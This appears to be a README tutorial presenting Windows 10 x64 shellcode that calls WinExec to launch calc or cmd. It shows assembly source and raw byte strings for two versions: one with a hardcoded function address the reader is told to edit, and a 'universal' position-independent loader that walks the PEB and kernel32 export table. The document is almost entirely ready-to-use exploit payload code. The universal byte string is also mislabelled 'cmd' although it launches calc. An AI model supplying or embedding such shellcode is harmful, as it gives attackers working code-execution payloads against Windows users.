# Windows 10 x64 Shellcode
It normally works on Microsoft Windows [Version 10.0.19042.1110]
Shellcode implements `WinExec("calc", SW_SHOW)`
1. Simple Shellcode
2. Univeral Shellcode

## Simple Shellcode (when knowing WinExec's address)
When user knows WinExec's address like using [get_func_addr](./get_func_addr.py), it is not a bad choice to use this simple shellcode.
```assembly
; simple_shellcode.asm
.code
	SHELLCODE proc
; function prolog
		push rbp
		mov rbp, rsp
		sub rsp, 20h
; call WinExec("calc", SW_SHOW)
		mov byte ptr[rbp-20h],63h
		mov byte ptr[rbp-1fh],61h
		mov byte ptr[rbp-1eh],6ch
		mov byte ptr[rbp-1dh],63h
		mov byte ptr[rbp-1ch],0h
		mov rdx, 5h
		lea rcx, [rbp-20h]
		mov rax, 7ffcf37b5f80h
		call rax
; function epilogue
		mov rsp, rbp		
		pop rbp
		ret
	SHELLCODE endp
end
```

The binary code is as follows. Since this is when WinExec's address is 0x7ffcf37b5f80, you can easily edit `\x80\x5F\x7B\xF3\xFC\x7F\x00\x00` to your address.

```shell
# WinExec("calc", SW_SHOW), len : 56
\x55\x48\x8B\xEC\x48\x83\xEC\x20\xC6\x45\xE0\x63\xC6\x45\xE1\x61\xC6\x45\xE2\x6C\xC6\x45\xE3\x63\xC6\x45\xE4\x00\x48\xC7\xC2\x05\x00\x00\x00\x48\x8D\x4D\xE0\x48\xB8\x80\x5F\x7B\xF3\xFC\x7F\x00\x00\xFF\xD0\x48\x8B\xE5\x5D\xC3
# WinExec("cmd", SW_SHOW), len : 52
\x55\x48\x8B\xEC\x48\x83\xEC\x20\xC6\x45\xE0\x63\xC6\x45\xE1\x6D\xC6\x45\xE2\x64\xC6\x45\xE3\x00\x48\xC7\xC2\x05\x00\x00\x00\x48\x8D\x4D\xE0\x48\xB8\x80\x5F\x7B\xF3\xFC\x7F\x00\x00\xFF\xD0\x48\x8B\xE5\x5D\xC3
```



## Universal Shellcode

This is the universal shellcode in Windows 10 x64. It parses TEB -> PEB -> ... -> kernel32.dll so that calculates `WinExec`'s Address.

```assembly
.code
	;
	; Universal SHELLCODE by ch4rli3kop
	;
	; This Universal Shellcode parse TEB and the export table in PE file 
	; to calculate WinExec's address 
	;
	; rbp-20h <- string 'calc'
	;
	; rax <- general purpose / Ordinal
	; rbx <- kernel32.dll base address / Function 'WinExec' Address
	; rcx <- export table address / AddressOfFunctions
	; rdx <- AddressOfNames
	; rdi <- AddressOfNameOrdinals
	; rsi <- Function Name
	; r8  <- String 'WinExec\x00'
	; r9  <- Function Address Offset
	;
	UNIVERSAL_SHELLCODE proc
	; function prolog
		push rbp
		mov rbp, rsp
		sub rsp, 20h

	; initialize
		xor rax, rax
		xor rbx, rbx
		xor rcx, rcx
		xor rdx, rdx
		xor rdi, rdi

	; get kernel32.dll base address
		xor rax, rax
		mov rax, gs : [rax+60h]		; get PEB address
		mov rax, [rax+18h]			; _PEB_LDR_DATA offset
		mov rax, [rax+20h]			; .exe InMemoryOrderModuleList
		mov rax, [rax]				; ntdll.dll InMemoryOrderModuleList
		mov rax, [rax]				; kernel32.dll InMemoryOrderModuleList
		mov rbx, [rax+20h]			; -0x10 + 0x30 / get dll base

	; get export table
		mov ecx, [rbx+3ch]			; get _IMAGE_NT_HEADERS64 start Offset
		add rcx, rbx				; get _IMAGE_NT_HEADERS64 start address
		mov ecx, [rcx+88h]			; 0x18(Optional Header Offset) + 0x70(Data Directory) + 0x0(Export Table index) / get  _IMAGE_EXPORT_DIRECTORY start Offset
		add rcx, rbx				; get _IMAGE_EXPORT_DIRECTORY start address
		
		mov edx, [rcx+20h]			; 0x20 get AddressOfNames Offset
		add rdx, rbx				; get AddressOfNames address
		mov edi, [rcx+24h]			; 0x20 get AddressOfNameOrdinals Offset
		add rdi, rbx				; get AddressOfNameOrdinals address
		mov ecx, [rcx+1ch]			; 0x20 get AddressOfFunctions Offset
		add rcx, rbx				; get AddressOfFunctions address

	; get function address
	
		xor rax, rax				; rax is index
		mov r8, 636578456e6957h		; 'WinExec\x00'
		
		not_found :
		xor rsi, rsi				; rsi is Name Pointer Table Entry
		mov esi, [rdx+4*rax]		; get Name Pointer Table Entry offset		
		add rsi, rbx				; Function Name String address
		mov rsi, [rsi]				; String Value (8 bytes)
		cmp r8, rsi					; compare 'WinExec'
		je found
		inc rax						; index++
		jmp not_found
		
		found :
		; rax is index
		xor r8, r8
		xor r9, r9
		mov r8w, [rdi+2*rax]		; get ordinal by index
		mov r9d, [rcx+4*r8]			; get function offset by ordinal
		add rbx, r9					; get function address

	; call WinExec("calc", SW_SHOW)
		mov byte ptr[rbp-20h],63h	; 'c'
		mov byte ptr[rbp-1fh],61h	; 'a'
		mov byte ptr[rbp-1eh],6ch	; 'l'
		mov byte ptr[rbp-1dh],63h	; 'c'
		mov byte ptr[rbp-1ch],0h
		mov rdx, 5h					; parameter 2
		lea rcx, [rbp-20h]			; parameter 1
		call rbx					; call WinExec()

	; function epilogue
		mov rsp, rbp		
		pop rbp
		ret
	UNIVERSAL_SHELLCODE endp
end
```

The binary code is as follows. I do not remove the null character now. I will do it later.

```shell
# WinExec("cmd", SW_SHOW), len : 173
\x55\x48\x8B\xEC\x48\x83\xEC\x20\x48\x33\xC0\x48\x33\xDB\x48\x33\xC9\x48\x33\xD2\x48\x33\xFF\x48\x33\xC0\x65\x48\x8B\x40\x60\x48\x8B\x40\x18\x48\x8B\x40\x20\x48\x8B\x00\x48\x8B\x00\x48\x8B\x58\x20\x8B\x4B\x3C\x48\x03\xCB\x8B\x89\x88\x00\x00\x00\x48\x03\xCB\x8B\x51\x20\x48\x03\xD3\x8B\x79\x24\x48\x03\xFB\x8B\x49\x1C\x48\x03\xCB\x48\x33\xC0\x49\xB8\x57\x69\x6E\x45\x78\x65\x63\x00\x48\x33\xF6\x8B\x34\x82\x48\x03\xF3\x48\x8B\x36\x4C\x3B\xC6\x74\x05\x48\xFF\xC0\xEB\xEA\x4D\x33\xC0\x4D\x33\xC9\x66\x44\x8B\x04\x47\x46\x8B\x0C\x81\x49\x03\xD9\xC6\x45\xE0\x63\xC6\x45\xE1\x61\xC6\x45\xE2\x6C\xC6\x45\xE3\x63\xC6\x45\xE4\x00\x48\xC7\xC2\x05\x00\x00\x00\x48\x8D\x4D\xE0\xFF\xD3\x48\x8B\xE5\x5D\xC3
```

